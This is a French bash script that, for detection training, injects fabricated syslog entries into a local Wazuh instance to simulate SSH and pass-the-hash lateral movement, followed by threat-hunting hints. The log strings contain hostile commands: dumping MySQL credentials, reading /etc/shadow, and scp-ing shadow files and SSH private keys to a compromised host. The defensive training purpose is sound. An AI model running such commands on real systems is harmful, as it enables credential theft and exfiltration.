#!/bin/bash

# ============================================================
#  SIMULATION — Lateral Movement (Niveau 3)
#  MITRE ATT&CK : T1021.004 (SSH), T1550.002 (Pass-the-Hash)
# ============================================================
#
#  Mouvement latéral depuis apt-host-42 vers d'autres machines.
#  SSH avec clé volée + simulation pass-the-hash via SMB/psexec.
#  L'attaquant pivote vers des systèmes plus critiques.
# ============================================================

WAZUH_IP="127.0.0.1"
SYSLOG_PORT="514"
SRC_HOST="apt-host-42"
TARGET1="srv-db-01"
TARGET2="srv-admin-02"
ATTACKER_USER="svc_monitor"  # Compte backdoor du niveau 2

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo ""
echo "============================================================"
echo -e "  ${RED}[SIMULATION] Lateral Movement — Niveau 3${NC}"
echo "============================================================"
echo ""
echo -e "  ${YELLOW}MITRE${NC}       : T1021.004 + T1550.002"
echo -e "  ${YELLOW}Source${NC}      : $SRC_HOST ($ATTACKER_USER)"
echo -e "  ${YELLOW}Cibles${NC}      : $TARGET1, $TARGET2"
echo ""

DATE=$(date '+%b %d %H:%M:%S')

send_syslog() {
    local host="$1"
    shift
    printf "<36>%s %s %s\n" "$DATE" "$host" "$1" | nc -u -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null || \
    printf "<36>%s %s %s\n" "$DATE" "$host" "$1" | nc -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null
}

echo -e "${CYAN}[*] Phase 1 — SSH depuis apt-host-42 vers srv-db-01 (clé SSH volée)...${NC}"
send_syslog "$TARGET1" "sshd[5001]: Accepted publickey for root from 10.0.0.42 port 48801 ssh2: RSA SHA256:Ax7mK9..."
send_syslog "$TARGET1" "sshd[5001]: pam_unix(sshd:session): session opened for user root by (uid=0)"
send_syslog "$TARGET1" "sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash"
sleep 0.5

echo -e "${CYAN}[*] Phase 2 — Reconnaissance sur srv-db-01...${NC}"
send_syslog "$TARGET1" "bash[5010]: cat /etc/mysql/mysql.conf.d/mysqld.cnf"
send_syslog "$TARGET1" "bash[5011]: mysql -u root -p'dumppass123' -e 'SELECT user,password FROM mysql.user'"
send_syslog "$TARGET1" "bash[5012]: mysqldump -u root -p'dumppass123' --all-databases > /tmp/.dump.sql"
sleep 0.5

echo -e "${CYAN}[*] Phase 3 — Pass-the-Hash simulation (NTLM hash réutilisé)...${NC}"
send_syslog "$TARGET2" "auth: pam_winbind(sshd:auth): user '$ATTACKER_USER' granted access"
send_syslog "$TARGET2" "sshd[5020]: Accepted password for $ATTACKER_USER from 10.0.0.42 port 49001 ssh2"
send_syslog "$TARGET2" "sshd[5020]: pam_unix(sshd:session): session opened for user $ATTACKER_USER"
sleep 0.5

echo -e "${CYAN}[*] Phase 4 — Accès à des ressources critiques sur srv-admin-02...${NC}"
send_syslog "$TARGET2" "sudo: $ATTACKER_USER : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"
send_syslog "$TARGET2" "sudo: $ATTACKER_USER : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash -i"
send_syslog "$TARGET2" "bash[5030]: scp /etc/shadow 10.0.0.42:/tmp/.loot/"
send_syslog "$TARGET2" "bash[5031]: scp /home/admin/.ssh/id_rsa 10.0.0.42:/tmp/.loot/"
sleep 0.3

echo ""
echo "============================================================"
echo -e "  ${GREEN}Simulation terminée${NC}"
echo "============================================================"
echo ""
echo "  Dans Wazuh → Threat Hunting :"
echo ""
echo -e "  ${CYAN}1. Cherche les connexions SSH entre hosts internes :${NC}"
echo "     data.srcip: 10.0.0.42 AND data.dstuser: root"
echo ""
echo -e "  ${CYAN}2. Corrélation kill chain :${NC}"
echo "     → L'IP 192.168.100.50 (niveau 1) a compromis apt-host-42"
echo "     → apt-host-42 (10.0.0.42) se déplace vers srv-db-01 et srv-admin-02"
echo "     → Même user backdoor 'svc_monitor' créé au niveau 2"
echo ""
echo -e "  ${CYAN}3. Signaux critiques :${NC}"
echo "     → SSH root-to-root entre machines internes"
echo "     → accès /etc/shadow depuis un compte non-root via sudo"
echo "     → scp de fichiers sensibles vers une IP interne compromise"
echo ""
